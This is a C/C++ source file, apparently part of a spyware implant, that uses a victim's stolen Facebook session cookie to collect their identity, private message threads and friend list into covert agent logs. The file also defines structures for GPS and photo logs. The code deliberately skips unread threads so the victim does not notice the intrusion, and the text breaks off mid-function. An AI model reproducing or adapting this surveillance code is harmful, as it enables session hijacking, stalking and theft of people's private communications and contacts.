#include <windows.h>
#include <stdio.h>
#include <time.h>
#include "..\common.h"
#include "..\LOG.h"
#include "SocialMain.h"
#include "NetworkHandler.h"
#include "..\utils.h"
#include "..\JSON\JSON.h"
#include "..\JSON\JSONValue.h"
#include "..\uthash.h"



/* start of photo definition */
extern BOOL bPM_PhotosStarted;

#define URL_SIZE_IN_CHARS	2048

#define FBID_TAG			"data-fbid=\""
#define FBID_TOKEN			"\"token\":\""
#define FBID_PHOTO_URL		"id=\"fbPhotoImage\" src=\"https://"
#define FBID_PHOTO_CAPTION  "<span class=\"hasCaption\">"
#define FBID_PHOTO_TAG_LIST	"<span class=\"fbPhotoTagList\" id=\"fbPhotoPageTagList\">"
#define FBID_PHOTO_TAG_ITEM "<span class=\"fbPhotoTagListTag tagItem\">"
#define FBID_PHOTO_LOCATION "<span class=\"fbPhotoTagListTag withTagItem tagItem\">"
#define FBID_PHOTO_TIMESTAMP "fbPhotoPageTimestamp"

// defining a 2nd time (HM_Photo.h)..
typedef struct _PHOTO_ADDITIONAL_HEADER
{
#define LOG_PHOTO_VERSION 2015012601
	UINT	uVersion;
	CHAR	strJsonLog[0];
} PHOTO_ADDITIONAL_HEADER, *LPPHOTO_ADDITIONAL_HEADER;

typedef struct _PHOTO_LOGS
{
	DWORD	dwSize;
	LPBYTE	lpBuffer;
} PHOTO_LOGS, *LPPHOTO_LOGS;

typedef struct _facebook_photo_id {
	UINT64	fbid;			// key
#define PHOTOS_YOURS	0
#define PHOTOS_OF_YOU	1
#define PHOTOS_ALBUM    2  // hack for shared album fbid order problem
	DWORD   dwType;			
	UT_hash_handle hh;		// handle
} facebook_photo_id;

typedef struct _facebook_placeId_to_location {
	UINT64 placeId;   // key
	FLOAT  latitude;
	FLOAT  longitude;
	UT_hash_handle hh;
} facebook_placeId_to_location;

/* start of string utils*/
bool replace(std::string& str, const std::string& from, const std::string& to) {
    size_t start_pos = str.find(from);
    if(start_pos == std::string::npos)
        return false;
    str.replace(start_pos, from.length(), to);
    return true;
}

void replaceAll(std::string& str, const std::string& from, const std::string& to) {
    if(from.empty())
        return;
    size_t start_pos = 0;
    while((start_pos = str.find(from, start_pos)) != std::string::npos) {
        str.replace(start_pos, from.length(), to);
        start_pos += to.length(); 
    }
}
/* end of photo definitions */


/* start of position definitions */
extern BOOL bPM_LocationStarted;

typedef struct _location_additionalheader_struct {
#define LOCATION_HEADER_VERSION 2010082401
	DWORD version;
	DWORD type;
	DWORD number_of_items;
} location_additionalheader_struct;

/* gps definition */

#define TYPE_LOCATION_GPS 1
#define GPS_MAX_SATELLITES      12

//
// GPS_VALID_XXX bit flags in GPS_POSITION structure are valid.
//
#define GPS_VALID_UTC_TIME                                 0x00000001
#define GPS_VALID_LATITUDE                                 0x00000002
#define GPS_VALID_LONGITUDE                                0x00000004
#define GPS_VALID_SPEED                                    0x00000008
#define GPS_VALID_HEADING                                  0x00000010
#define GPS_VALID_MAGNETIC_VARIATION                       0x00000020
#define GPS_VALID_ALTITUDE_WRT_SEA_LEVEL                   0x00000040
#define GPS_VALID_ALTITUDE_WRT_ELLIPSOID                   0x00000080
#define GPS_VALID_POSITION_DILUTION_OF_PRECISION           0x00000100
#define GPS_VALID_HORIZONTAL_DILUTION_OF_PRECISION         0x00000200
#define GPS_VALID_VERTICAL_DILUTION_OF_PRECISION           0x00000400
#define GPS_VALID_SATELLITE_COUNT                          0x00000800
#define GPS_VALID_SATELLITES_USED_PRNS                     0x00001000
#define GPS_VALID_SATELLITES_IN_VIEW                       0x00002000
#define GPS_VALID_SATELLITES_IN_VIEW_PRNS                  0x00004000
#define GPS_VALID_SATELLITES_IN_VIEW_ELEVATION             0x00008000
#define GPS_VALID_SATELLITES_IN_VIEW_AZIMUTH               0x00010000
#define GPS_VALID_SATELLITES_IN_VIEW_SIGNAL_TO_NOISE_RATIO 0x00020000

//
// GPS_DATA_FLAGS_XXX bit flags set in GPS_POSITION dwFlags field
// provide additional information about the state of the query.
// 

// Set when GPS hardware is not connected to GPSID and we 
// are returning cached data.
#define GPS_DATA_FLAGS_HARDWARE_OFF                        0x00000001

typedef enum {
	GPS_FIX_UNKNOWN = 0,
	GPS_FIX_2D,
	GPS_FIX_3D
}
GPS_FIX_TYPE;

typedef enum {
	GPS_FIX_SELECTION_UNKNOWN = 0,
	GPS_FIX_SELECTION_AUTO,
	GPS_FIX_SELECTION_MANUAL
}
GPS_FIX_SELECTION;

typedef enum {
	GPS_FIX_QUALITY_UNKNOWN = 0,
	GPS_FIX_QUALITY_GPS,
	GPS_FIX_QUALITY_DGPS
}
GPS_FIX_QUALITY;

#pragma pack(1)
typedef struct _GPS_POSITION {
        DWORD dwVersion;             // Current version of GPSID client is using.
        DWORD dwSize;                // sizeof(_GPS_POSITION)

        // Not all fields in the structure below are guaranteed to be valid.  
        // Which fields are valid depend on GPS device being used, how stale the API allows
        // the data to be, and current signal.
        // Valid fields are specified in dwValidFields, based on GPS_VALID_XXX flags.
        DWORD dwValidFields;

        // Additional information about this location structure (GPS_DATA_FLAGS_XXX)
#define FACEBOOK_CHECK_IN 0x1
        DWORD dwFlags;
        
        //** Time related
        SYSTEMTIME stUTCTime;   //  UTC according to GPS clock.
        
        //** Position + heading related
        double dblLatitude;            // Degrees latitude.  North is positive
        double dblLongitude;           // Degrees longitude.  East is positive
        float  flSpeed;                // Speed in knots
        float  flHeading;              // Degrees heading (course made good).  True North=0
        double dblMagneticVariation;   // Magnetic variation.  East is positive
        float  flAltitudeWRTSeaLevel;  // Altitute with regards to sea level, in meters
        float  flAltitudeWRTEllipsoid; // Altitude with regards to ellipsoid, in meters

        ////** Quality of this fix
        GPS_FIX_QUALITY     FixQuality;        // Where did we get fix from?
        GPS_FIX_TYPE        FixType;           // Is this 2d or 3d fix?
        GPS_FIX_SELECTION   SelectionType;     // Auto or manual selection between 2d or 3d mode
        float flPositionDilutionOfPrecision;   // Position Dilution Of Precision
        float flHorizontalDilutionOfPrecision; // Horizontal Dilution Of Precision
        float flVerticalDilutionOfPrecision;   // Vertical Dilution Of Precision

        ////** Satellite information -- name here
        DWORD dwSatelliteCount;                                            // Number of satellites used in solution
        DWORD rgdwSatellitesUsedPRNs[GPS_MAX_SATELLITES];                  // PRN numbers of satellites used in the solution

        DWORD dwSatellitesInView;                                          // Number of satellites in view.  From 0-GPS_MAX_SATELLITES
        DWORD rgdwSatellitesInViewPRNs[GPS_MAX_SATELLITES];                // PRN numbers of satellites in view
        DWORD rgdwSatellitesInViewElevation[GPS_MAX_SATELLITES];           // Elevation of each satellite in view
        DWORD rgdwSatellitesInViewAzimuth[GPS_MAX_SATELLITES];             // Azimuth of each satellite in view
        DWORD rgdwSatellitesInViewSignalToNoiseRatio[GPS_MAX_SATELLITES];  // Signal to noise ratio of each satellite in view
} GPS_POSITION, *PGPS_POSITION;

typedef struct _gps_data_struct {
	DWORD dwFail;
	UINT uSize;
#define GPS_VERSION (UINT)2008121901
	UINT uVersion;
	FILETIME ft;
	GPS_POSITION gps;
#define LOG_DELIMITER 0xABADC0DE
	DWORD dwDelimiter;
} gps_data_struct;
#pragma pack()

/* end of position definitions */

//#define FB_USER_ID "\"user\":\""
//#define FB_USER_ID "\"id\":\""
#define FB_USER_ID "\"USER_ID\":\""

#define FB_THREAD_LIST_ID "\"threads\":[{"
#define FB_THREAD_LIST_END "\"ordered_threadlists\":"

#define FB_THREAD_IDENTIFIER "\\/messages\\/?action=read&amp;tid="
#define FB_THREAD_IDENTIFIER_V2 "\"thread_id\":\""

#define FB_THREAD_AUTHOR_IDENTIFIER "class=\\\"authors\\\">"
#define FB_THREAD_AUTHOR_IDENTIFIER_V2 "\"DocumentTitle.set(\\\""

#define FB_THREAD_STATUS_IDENTIFIER "class=\\\"threadRow noDraft"
#define FB_THREAD_STATUS_IDENTIFIER_V2 "\"unread_count\":"

#define FB_MESSAGE_TSTAMP_IDENTIFIER "data-utime=\\\""
#define FB_MESSAGE_TSTAMP_IDENTIFIER_V2 "\"timestamp\":"

#define FB_MESSAGE_BODY_IDENTIFIER "div class=\\\"content noh\\\" id=\\\""
#define FB_MESSAGE_AUTHOR_IDENTIFIER "\\u003C\\/a>\\u003C\\/strong>"
#define FB_MESSAGE_SCREEN_NAME_ID "\"id\":\"%s\",\"name\":\""
#define FB_NEW_LINE "\\u003Cbr \\/> "
#define FB_POST_FORM_ID "post_form_id\":\""
#define FB_PEER_ID_IDENTIFIER "\"fbid:"
#define FB_DTSG_ID "fb_dtsg\":\""
#define FACEBOOK_THREAD_LIMIT 15
#define MAX_FACEBOOK_ACCOUNTS 500 
#define FB_INVALID_TSTAMP 0xFFFFFFFF

extern BOOL bPM_IMStarted; // variabili per vedere se gli agenti interessati sono attivi
extern BOOL bPM_ContactsStarted; 

extern BOOL DumpContact(HANDLE hfile, DWORD program, WCHAR *name, WCHAR *email, WCHAR *company, WCHAR *addr_home, WCHAR *addr_office, WCHAR *phone_off, WCHAR *phone_mob, WCHAR *phone_hom, WCHAR *skype_name, WCHAR *facebook_page, DWORD flags);
extern wchar_t *UTF8_2_UTF16(char *str); // in firefox.cpp

typedef struct {
	char user[48];
	DWORD tstamp_lo;
	DWORD tstamp_hi;
} last_tstamp_struct;
last_tstamp_struct *last_tstamp_array = NULL;

DWORD GetLastFBTstamp(char *user, DWORD *hi_part)
{
	DWORD i;

	if (hi_part)
		*hi_part = FB_INVALID_TSTAMP;

	// Se e' la prima volta che viene chiamato 
	// alloca l'array
	if (!last_tstamp_array) {
		last_tstamp_array = (last_tstamp_struct *)calloc(MAX_FACEBOOK_ACCOUNTS, sizeof(last_tstamp_struct));
		if (!last_tstamp_array)
			return FB_INVALID_TSTAMP;
		Log_RestoreAgentState(PM_SOCIALAGENT_FB, (BYTE *)last_tstamp_array, MAX_FACEBOOK_ACCOUNTS*sizeof(last_tstamp_struct));
	}
	if (!user || !user[0])
		return FB_INVALID_TSTAMP;

	for (i=0; i<MAX_FACEBOOK_ACCOUNTS; i++) {
		if (last_tstamp_array[i].user[0] == 0) {
			if (hi_part)
				*hi_part = 0;
			return 0;
		}
		if (!strcmp(user, last_tstamp_array[i].user)) {
			if (hi_part)
				*hi_part = last_tstamp_array[i].tstamp_hi;
			return last_tstamp_array[i].tstamp_lo;
		}
	}
	return FB_INVALID_TSTAMP;
}

void SetLastFBTstamp(char *user, DWORD tstamp_lo, DWORD tstamp_hi)
{
	DWORD i, dummy;

	if (!user || !user[0])
		return;

	if (tstamp_lo==0 && tstamp_hi==0)
		return;

	if (!last_tstamp_array && GetLastFBTstamp(user, &dummy)==FB_INVALID_TSTAMP && dummy==FB_INVALID_TSTAMP)
		return;

	for (i=0; i<MAX_FACEBOOK_ACCOUNTS; i++) {
		if (last_tstamp_array[i].user[0] == 0)
			break;
		if (!strcmp(user, last_tstamp_array[i].user)) {
			if (tstamp_hi < last_tstamp_array[i].tstamp_hi)
				return;
			if (tstamp_hi==last_tstamp_array[i].tstamp_hi && tstamp_lo<=last_tstamp_array[i].tstamp_lo) 
				return;
			last_tstamp_array[i].tstamp_hi = tstamp_hi;
			last_tstamp_array[i].tstamp_lo = tstamp_lo;
			Log_SaveAgentState(PM_SOCIALAGENT_FB, (BYTE *)last_tstamp_array, MAX_FACEBOOK_ACCOUNTS*sizeof(last_tstamp_struct));
			return;
		}
	}

	for (i=0; i<MAX_FACEBOOK_ACCOUNTS; i++) {
		// Lo scrive nella prima entry libera
		if (last_tstamp_array[i].user[0] == 0) {
			_snprintf_s(last_tstamp_array[i].user, 48, _TRUNCATE, "%s", user);		
			last_tstamp_array[i].tstamp_hi = tstamp_hi;
			last_tstamp_array[i].tstamp_lo = tstamp_lo;
			Log_SaveAgentState(PM_SOCIALAGENT_FB, (BYTE *)last_tstamp_array, MAX_FACEBOOK_ACCOUNTS*sizeof(last_tstamp_struct));
			return;
		}
	}
}

DWORD HandleFBMessages(char *cookie)
{
	DWORD ret_val;
	BYTE *r_buffer = NULL;
	BYTE *r_buffer_inner = NULL;
	DWORD response_len, dummy;
	WCHAR url[256];
	BOOL me_present = FALSE;
	BYTE *parser1, *parser2;
	BYTE *parser_inner1, *parser_inner2;
	BOOL is_incoming = FALSE;
	char peers[512];
	char peers_id[256];
	char author[256];
	char author_id[256];
	char tstamp[11];
	DWORD act_tstamp;
	DWORD last_tstamp = 0;
	char *msg_body = NULL;
	DWORD msg_body_size, msg_part_size;
	char user[256];
	char form_id[256];
	char dtsg_id[256];
	char post_data[512];
	char screen_name_tag[256];
	char screen_name[256];

	CheckProcessStatus();

	if (!bPM_IMStarted)
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	
	// Identifica l'utente
	ret_val = HttpSocialRequest(L"www.facebook.com", L"GET", L"/home.php?", 443, NULL, 0, &r_buffer, &response_len, cookie);	
	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;
	parser1 = (BYTE *)strstr((char *)r_buffer, FB_USER_ID);
	if (!parser1) {
		SAFE_FREE(r_buffer);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}
	parser1 += strlen(FB_USER_ID);
	parser2 = (BYTE *)strchr((char *)parser1, '\"');
	if (!parser2) {
		SAFE_FREE(r_buffer);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}
	*parser2=0;
	_snprintf_s(user, sizeof(user), _TRUNCATE, "%s", parser1);

	// Torna utente "0" se non siamo loggati
	if (!strcmp(user, "0")) {
		SAFE_FREE(r_buffer);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}

	// Cerca di ricavare lo screen name
	do {
		_snprintf_s(screen_name, sizeof(screen_name), _TRUNCATE, "Target");
		_snprintf_s(screen_name_tag, sizeof(screen_name_tag), _TRUNCATE, FB_MESSAGE_SCREEN_NAME_ID, user);
		parser1 = parser2 + 1;
		parser1 = (BYTE *)strstr((char *)parser1, screen_name_tag);
		if (!parser1)
			break;
		parser1 += strlen(screen_name_tag);
		parser2 = (BYTE *)strchr((char *)parser1, '\"');
		if (!parser2)
			break;
		*parser2=0;
		if (strlen((char *)parser1))
			_snprintf_s(screen_name, sizeof(screen_name), _TRUNCATE, "%s", parser1);
	} while(0);

	SAFE_FREE(r_buffer);

	// Carica dal file il last time stamp per questo utente
	last_tstamp = GetLastFBTstamp(user, NULL);
	if (last_tstamp == FB_INVALID_TSTAMP)
		return SOCIAL_REQUEST_BAD_COOKIE;

	// Prende la lista dei thread
	ret_val = HttpSocialRequest(L"www.facebook.com", L"GET", L"/messages/", 443, NULL, 0, &r_buffer, &response_len, cookie);	
	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;

	parser1 = (BYTE *)strstr((char *)r_buffer, FB_POST_FORM_ID);
	if (parser1) {
		parser1 += strlen(FB_POST_FORM_ID);
		parser2 = (BYTE *)strchr((char *)parser1, '\"');
		if (!parser2) {
			SAFE_FREE(r_buffer);
			return SOCIAL_REQUEST_BAD_COOKIE;
		}
		*parser2=0;
		_snprintf_s(form_id, sizeof(form_id), _TRUNCATE, "%s", parser1);
		parser1 = parser2 + 1;
	} else {
		parser1 = r_buffer;
		memset(form_id, 0, sizeof(form_id));
	}

	parser1 = (BYTE *)strstr((char *)parser1, FB_DTSG_ID);
	if (parser1) {
		parser1 += strlen(FB_DTSG_ID);
		parser2 = (BYTE *)strchr((char *)parser1, '\"');
		if (!parser2) {
			SAFE_FREE(r_buffer);
			return SOCIAL_REQUEST_BAD_COOKIE;
		}
		*parser2=0;
		_snprintf_s(dtsg_id, sizeof(dtsg_id), _TRUNCATE, "%s", parser1);
	} else {
		memset(dtsg_id, 0, sizeof(dtsg_id));
	}

	SAFE_FREE(r_buffer);
	_snprintf_s(post_data, sizeof(post_data), _TRUNCATE, "post_form_id=%s&fb_dtsg=%s&lsd&post_form_id_source=AsyncRequest&__user=%s&phstamp=145816710610967116112122", form_id, dtsg_id, user);

	// Chiede la lista dei thread
	ret_val = HttpSocialRequest(L"www.facebook.com", L"GET", L"/messages/", 443, NULL, 0, &r_buffer, &response_len, cookie);	
	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;

	// Individua la lista dei thread nella risposta
	parser1 = (BYTE *)strstr((char *)r_buffer, FB_THREAD_LIST_END);
	if (!parser1) {
		SAFE_FREE(r_buffer);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}
	*parser1 = 0;

	parser1 = (BYTE *)strstr((char *)r_buffer, FB_THREAD_LIST_ID);
	if (!parser1) {
		SAFE_FREE(r_buffer);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}

	// Cicla la lista dei thread
	for (;;) {
		CheckProcessStatus();
		parser2 = (BYTE *)strstr((char *)parser1, FB_THREAD_STATUS_IDENTIFIER_V2);
		if (!parser2)
			break;
		parser2 += strlen(FB_THREAD_STATUS_IDENTIFIER_V2);
		// Salta i thread unread per non cambiare il loro stato!!!!
		if(*parser2 != '0') {
			parser1 = parser2;
			continue;
		}

		parser1 = (BYTE *)strstr((char *)parser1, FB_THREAD_IDENTIFIER_V2);
		if (!parser1)
			break;
		parser1 += strlen(FB_THREAD_IDENTIFIER_V2);
		parser2 = (BYTE *)strstr((char *)parser1, "\"");
		if (!parser2)
			break;
		*parser2 = 0;
		urldecode((char *)parser1);
		// Se voglio andare piu' indietro aggiungo alla richiesta...per ora pero' va bene cosi'
		// &thread_offset=0&num_msgs=60
		_snwprintf_s(url, sizeof(url)/sizeof(WCHAR), _TRUNCATE, L"/ajax/messaging/async.php?sk=inbox&action=read&tid=%S&__a=1&msgs_only=1", parser1);
		parser1 = parser2 + 1;

		// Cerca gli id dei partecipanti
		memset(peers_id, 0, sizeof(peers_id));
		me_present = FALSE;
		for (;;) {
			parser2 = (BYTE *)strstr((char *)parser1, FB_PEER_ID_IDENTIFIER);
			if (!parser2)
				break;
			parser1 = parser2 + strlen(FB_PEER_ID_IDENTIFIER);
			parser2 = (BYTE *)strstr((char *)parser1, "\"");
			if (!parser2)
				break;
			*parser2 = 0;

			if (!strcmp((CHAR *)parser1, user))
				me_present = TRUE;

			if (strlen(peers_id) == 0)
				_snprintf_s(peers_id, sizeof(peers_id), _TRUNCATE, "%s", parser1);
			else
				_snprintf_s(peers_id, sizeof(peers_id), _TRUNCATE, "%s,%s", peers_id, parser1);
			
			parser1 = parser2 +1;

			// Smette quando sono finiti i participants
			if (*parser1 == ']')
				break;
		}	
		if (!me_present)
			_snprintf_s(peers_id, sizeof(peers_id), _TRUNCATE, "%s,%s", peers_id, user);

		parser1 = (BYTE *)strstr((char *)parser1, FB_MESSAGE_TSTAMP_IDENTIFIER_V2);
		if (!parser1)
			break;
		parser1 += strlen(FB_MESSAGE_TSTAMP_IDENTIFIER_V2);
		memset(tstamp, 0, sizeof(tstamp));
		memcpy(tstamp, parser1, 10);
		act_tstamp = atoi(tstamp);
		if (act_tstamp>2000000000 || act_tstamp <= last_tstamp)
			continue;
		SetLastFBTstamp(user, act_tstamp, 0);

		// Pe ogni thread chiede tutti i rispettivi messaggi
		//ret_val = HttpSocialRequest(L"www.facebook.com", L"POST", url, 443, (BYTE *)post_data, strlen(post_data), &r_buffer_inner, &dummy, cookie);
		ret_val = HttpSocialRequest(L"www.facebook.com", L"GET", url, 443, NULL, 0, &r_buffer_inner, &dummy, cookie);
		if (ret_val != SOCIAL_REQUEST_SUCCESS) {
			SAFE_FREE(r_buffer);
			return ret_val;
		}

		// Prende gli screenname di tutti i partecipanti
		parser_inner1 = r_buffer_inner;
		parser_inner1 = (BYTE *)strstr((char *)parser_inner1, FB_THREAD_AUTHOR_IDENTIFIER_V2);
		if (!parser_inner1) {
			SAFE_FREE(r_buffer_inner);
			continue;
		}
		parser_inner1 += strlen(FB_THREAD_AUTHOR_IDENTIFIER_V2);
		parser_inner2 = (BYTE *)strstr((char *)parser_inner1, " - ");
		if (!parser_inner2) {
			SAFE_FREE(r_buffer_inner);
			continue;
		}
		*parser_inner2 = 0;
		_snprintf_s(peers, sizeof(peers), _TRUNCATE, "%s, %s", screen_name, parser_inner1);

		parser_inner1 = r_buffer_inner;
		// Clicla per tutti i messaggi del thread
		for (;;) {			
			CheckProcessStatus();
			parser_inner1 = (BYTE *)strstr((char *)parser_inner1, FB_MESSAGE_TSTAMP_IDENTIFIER);
			if (!parser_inner1)
				break;
			parser_inner1 += strlen(FB_MESSAGE_TSTAMP_IDENTIFIER);
			memset(tstamp, 0, sizeof(tstamp));
			memcpy(tstamp, parser_inner1, 10);
			act_tstamp = atoi(tstamp);
			if (act_tstamp>2000000000 || act_tstamp <= last_tstamp)
				continue;
			SetLastFBTstamp(user, act_tstamp, 0);

			parser_inner2 = (BYTE *)strstr((char *)parser_inner1, FB_MESSAGE_AUTHOR_IDENTIFIER);
			if (!parser_inner2)
				break;
			*parser_inner2 = 0;
			parser_inner1 = parser_inner2;
			for (;*(parser_inner1) != '>' && parser_inner1 > r_buffer_inner; parser_inner1--);
			if (parser_inner1 <= r_buffer_inner)
				break;
			parser_inner1++;
			_snprintf_s(author, sizeof(author), _TRUNCATE, "%s", parser_inner1);
			parser_inner1--;
			for (;*(parser_inner1) != '\\' && parser_inner1 > r_buffer_inner; parser_inner1--);
			if (parser_inner1 <= r_buffer_inner)
				break;
			*parser_inner1 = 0;
			for (;*(parser_inner1) != '=' && parser_inner1 > r_buffer_inner; parser_inner1--);
			if (parser_inner1 <= r_buffer_inner)
				break;
			parser_inner1++;
			_snprintf_s(author_id, sizeof(author_id), _TRUNCATE, "%s", parser_inner1);
			parser_inner1 = parser_inner2 + 1;
			
			if (!strcmp(author_id, user))
				is_incoming = FALSE;
			else 
				is_incoming = TRUE;

			// Cicla per tutti i possibili body del messaggio
			SAFE_FREE(msg_body);
			msg_body_size = 0;
			for (;;) {
				BYTE *tmp_ptr1, *tmp_ptr2;
				tmp_ptr1 = (BYTE *)strstr((char *)parser_inner1, FB_MESSAGE_BODY_IDENTIFIER);
				if (!tmp_ptr1)
					break;
				// Non ci sono piu' body (c'e' gia' un nuovo timestamp)
				tmp_ptr2 = (BYTE *)strstr((char *)parser_inner1, FB_MESSAGE_TSTAMP_IDENTIFIER);
				if (tmp_ptr2 && tmp_ptr2<tmp_ptr1)
					break;
				parser_inner1 = tmp_ptr1;
				parser_inner1 = (BYTE *)strstr((char *)parser_inner1, "p>");
				if (!parser_inner1)
					break;
				parser_inner1 += strlen("p>");
				parser_inner2 = (BYTE *)strstr((char *)parser_inner1, "\\u003C\\/p>");
				if (!parser_inner2)
					break;
				*parser_inner2 = 0;

				msg_part_size = strlen((char *)parser_inner1);
				tmp_ptr1 = (BYTE *)realloc(msg_body, msg_body_size + msg_part_size + strlen(FB_NEW_LINE) + sizeof(WCHAR));
				if (!tmp_ptr1)
					break;
				// Se non e' il primo body, accodiamo un "a capo"
				if (msg_body) {
					memcpy(tmp_ptr1 + msg_body_size, FB_NEW_LINE, strlen(FB_NEW_LINE));
					msg_body_size += strlen(FB_NEW_LINE);
				}

				msg_body = (char *)tmp_ptr1;
				memcpy(msg_body + msg_body_size, parser_inner1, msg_part_size);
				msg_body_size += msg_part_size;
				// Null-termina sempre il messaggio
				memset(msg_body + msg_body_size, 0, sizeof(WCHAR));

				parser_inner1 = parser_inner2 + 1;
			}

			// Vede se deve mettersi in pausa o uscire
			CheckProcessStatus();

			if (msg_body) {
				struct tm tstamp;
				_gmtime32_s(&tstamp, (__time32_t *)&act_tstamp);
				tstamp.tm_year += 1900;
				tstamp.tm_mon++;
				JsonDecode(msg_body);
				LogSocialIMMessageA(CHAT_PROGRAM_FACEBOOK, peers, peers_id, author, author_id, msg_body, &tstamp, is_incoming);
				SAFE_FREE(msg_body);
			} else
				break;
		}
		SAFE_FREE(r_buffer_inner);
	}

	SAFE_FREE(r_buffer);
	CheckProcessStatus();

	return SOCIAL_REQUEST_SUCCESS;
}


#define FB_CONTACT_IDENTIFIER "\"user\",\"text\":\""
#define FB_CPATH_IDENTIFIER ",\"path\":\""
#define FB_CATEGORY_IDENTIFIER ",\"category\":\""
#define FB_UID_IDENTIFIER "\"uid\":"
DWORD HandleFBContacts(char *cookie)
{
	DWORD ret_val;
	BYTE *r_buffer = NULL;
	DWORD response_len;
	char *parser1, *parser2, *parser3;
	WCHAR fb_request[256];
	char user[256];
	WCHAR *name_w, *profile_w, *category_w;
	char contact_name[256];
	char profile_path[256];
	char category[256];
	static BOOL scanned = FALSE;
	HANDLE hfile;
	DWORD flags;

	CheckProcessStatus();

	if (!bPM_ContactsStarted)
		return SOCIAL_REQUEST_NETWORK_PROBLEM;

	if (scanned)
		return SOCIAL_REQUEST_SUCCESS;
	
	// Identifica l'utente
	ret_val = HttpSocialRequest(L"www.facebook.com", L"GET", L"/home.php?", 443, NULL, 0, &r_buffer, &response_len, cookie);	
	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;
	parser1 = strstr((char *)r_buffer, FB_USER_ID);
	if (!parser1) {
		SAFE_FREE(r_buffer);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}
	parser1 += strlen(FB_USER_ID);
	parser2 = strchr(parser1, '\"');
	if (!parser2) {
		SAFE_FREE(r_buffer);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}
	*parser2=0;
	_snprintf_s(user, sizeof(user), _TRUNCATE, "%s", parser1);
	SAFE_FREE(r_buffer);

	// Torna utente "0" se non siamo loggati
	if (!strcmp(user, "0"))
		return SOCIAL_REQUEST_BAD_COOKIE;

	// Chiede la lista dei contatti
	_snwprintf_s(fb_request, sizeof(fb_request)/sizeof(WCHAR), _TRUNCATE, L"/ajax/typeahead/first_degree.php?__a=1&viewer=%S&token=v7&filter[0]=user&options[0]=friends_only&__user=%S", user, user);
	ret_val = HttpSocialRequest(L"www.facebook.com", L"GET", fb_request, 443, NULL, 0, &r_buffer, &response_len, cookie);
	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;

	CheckProcessStatus();
	parser1 = (char *)r_buffer;
	
	hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
	for (;;) {
		flags = 0;
		parser1 = strstr(parser1, FB_UID_IDENTIFIER);
		if (!parser1)
			break;
		parser1 += strlen(FB_UID_IDENTIFIER);
		parser2 = strchr(parser1, ',');
		if (!parser2)
			break;
		*parser2 = NULL;
		_snprintf_s(profile_path, sizeof(profile_path), _TRUNCATE, "%s", parser1);
		if (!strcmp(user, parser1))
			flags |= CONTACTS_MYACCOUNT;
		parser1 = parser2 + 1;

		parser1 = strstr(parser1, FB_CONTACT_IDENTIFIER);
		if (!parser1)
			break;
		parser1 += strlen(FB_CONTACT_IDENTIFIER);
		parser2 = strchr(parser1, '\"');
		if (!parser2)
			break;
		*parser2 = NULL;
		_snprintf_s(contact_name, sizeof(contact_name), _TRUNCATE, "%s", parser1);
		parser1 = parser2 + 1;

		parser1 = strstr(parser1, FB_CPATH_IDENTIFIER);
		if (!parser1)
			break;
		parser1 += strlen(FB_CPATH_IDENTIFIER);
		parser2 = strchr(parser1, '\"');
		if (!parser2)
			break;
		*parser2 = NULL;
		//_snprintf_s(profile_path, sizeof(profile_path), _TRUNCATE, "%s", parser1);
		parser1 = parser2 + 1;

		// Verifica se c'e' category
		category[0]=NULL;
		parser2 = strstr(parser1, FB_CATEGORY_IDENTIFIER);
		if (parser2) {
			parser3 = strstr(parser1, FB_CONTACT_IDENTIFIER);
			if (!parser3 || parser3>parser2) {
				parser1 = parser2;
				parser1 += strlen(FB_CATEGORY_IDENTIFIER);
				parser2 = strchr(parser1, '\"');
				if (!parser2)
					break;
				*parser2 = NULL;
				_snprintf_s(category, sizeof(category), _TRUNCATE, "%s", parser1);
				parser1 = parser2 + 1;
			}
		}
		JsonDecode(contact_name);
		JsonDecode(profile_path);
		JsonDecode(category);

		name_w = UTF8_2_UTF16(contact_name);
		profile_w = UTF8_2_UTF16(profile_path);
		category_w = UTF8_2_UTF16(category);

		if (profile_w[0] == L'/') // Toglie lo / dalla facebook page
			DumpContact(hfile, CONTACT_SRC_FACEBOOK, name_w, NULL, NULL, category_w, NULL, NULL, NULL, NULL, NULL, profile_w+1, flags);
		else
			DumpContact(hfile, CONTACT_SRC_FACEBOOK, name_w, NULL, NULL, category_w, NULL, NULL, NULL, NULL, NULL, profile_w, flags);
		
		SAFE_FREE(name_w);
		SAFE_FREE(profile_w);
		SAFE_FREE(category_w);
	}
	Log_CloseFile(hfile);

	scanned = TRUE;
	SAFE_FREE(r_buffer);
	return SOCIAL_REQUEST_SUCCESS;
}



/* Facebook position functions */
LPSTR FacebookGetUserId(LPSTR strBuffer)
{
	LPSTR strParser = strstr(strBuffer, FB_USER_ID);
	if (!strParser)
		return NULL;

	strParser += strlen(FB_USER_ID);
	if (strchr(strParser, '"'))
		*(strchr(strParser, '"')) = 0;
	else
		return NULL;

	return strParser;
}

LPSTR FacebookGetScreenName(LPSTR strBuffer, LPSTR strUserId)
{
	CHAR strScreenNameTag[256] = { 0x0 };

	_snprintf_s(strScreenNameTag, 255, _TRUNCATE, FB_MESSAGE_SCREEN_NAME_ID, strUserId);
	LPSTR strParser = strstr(strBuffer, strScreenNameTag);
	if (!strParser)
		return NULL;

	strParser += strlen(strScreenNameTag);
	if (strchr(strParser, '"'))
		*(strchr(strParser, '"')) = 0;
	else
		return NULL;

	if (strlen(strParser))
		return strParser;
	else 
		return "Target";
}

BOOL FacebookGetUserInfo(LPSTR strCookie, LPSTR *strUserId, LPSTR *strScreenName)
{
	LPSTR strRecvBuffer=NULL, strParser=NULL;
	DWORD dwRet, dwBufferSize;

	*strUserId = *strScreenName = NULL;

	CheckProcessStatus();
	dwRet = HttpSocialRequest(L"www.facebook.com", L"GET", L"/home.php?", 443, NULL, 0, (LPBYTE *)&strRecvBuffer, &dwBufferSize, strCookie); // FIXME array
	if (dwRet != SOCIAL_REQUEST_SUCCESS)
		return FALSE;

